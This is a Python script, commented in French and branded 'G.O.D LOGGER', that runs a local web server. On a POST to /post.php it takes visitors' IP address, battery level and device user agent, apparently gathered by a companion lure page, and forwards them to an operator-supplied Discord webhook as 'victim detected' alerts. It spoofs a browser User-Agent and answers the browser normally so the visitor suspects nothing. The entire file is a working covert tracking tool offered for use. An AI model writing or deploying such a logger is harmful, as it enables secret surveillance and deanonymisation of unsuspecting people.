import http.server
import socketserver
import json
import urllib.request
import os

# Nettoyage et affichage du logo
os.system("clear")
print("\033[31m")
print("  ██████╗  ██████╗ ██████╗ ")
print(" ██╔════╝ ██╔═══██╗██╔══██╗")
print(" ██║  ███╗██║   ██║██║  ██║")
print(" ██║   ██║██║   ██║██║  ██║")
print(" ╚██████╔╝╚██████╔╝██████╔╝")
print("  ╚═════╝  ╚═════╝ ╚═════╝ ")
print("\033[0m")
print("-" * 40)
print("\033[33m      LA PIRATERIE C'EST JAMAIS FINI\033[0m")
print("-" * 40)

# Demande du Webhook à l'utilisateur
WEBHOOK_URL = input("\033[32m[+]\033[0m Entre ton Webhook Discord : ").strip()

class PirateHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/post.php':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                # Lecture des données envoyées par l'index.html
                data = json.loads(post_data.decode('utf-8'))
                
                # Préparation du message pour Discord
                payload = {
                    "username": "G.O.D LOGGER",
                    "avatar_url": "https://cdn-icons-png.flaticon.com/512/0/740.png",
                    "embeds": [{
                        "title": "🎯 VICTIME DÉTECTÉE",
                        "color": 15158332,
                        "fields": [
                            {"name": "📍 IP", "value": f"`{data.get('ip', 'Inconnue')}`", "inline": True},
                            {"name": "🔋 Batterie", "value": f"`{data.get('batt', '0')}%`", "inline": True},
                            {"name": "📱 Appareil", "value": f"```{data.get('ua', 'N/A')}```", "inline": False}
                        ],
                        "footer": {"text": "G.O.D EDITION - La piraterie c'est jamais fini"}
                    }]
                }
                
                # AJOUT DES HEADERS POUR ÉVITER L'ERREUR 403
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
                
                # Envoi vers Discord
                req = urllib.request.Request(WEBHOOK_URL, data=json.dumps(payload).encode('utf-8'), headers=headers)
                urllib.request.urlopen(req)
                print("\033[32m[SUCCESS]\033[0m Infos envoyées au Webhook !")
                
            except Exception as e:
                print(f"\033[31m[ERREUR]\033[0m Impossible d'envoyer à Discord : {e}")
            
            # Réponse au navigateur pour éviter qu'il ne s'en doute
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

# Lancement du serveur sur le port 8080
with socketserver.TCPServer(("", 8080), PirateHandler) as httpd:
    print("\033[36m[*]\033[0m Serveur G.O.D actif sur http://127.0.0.1:8080")
    print("\033[36m[*]\033[0m En attente de connexions...")
    httpd.serve_forever()
    
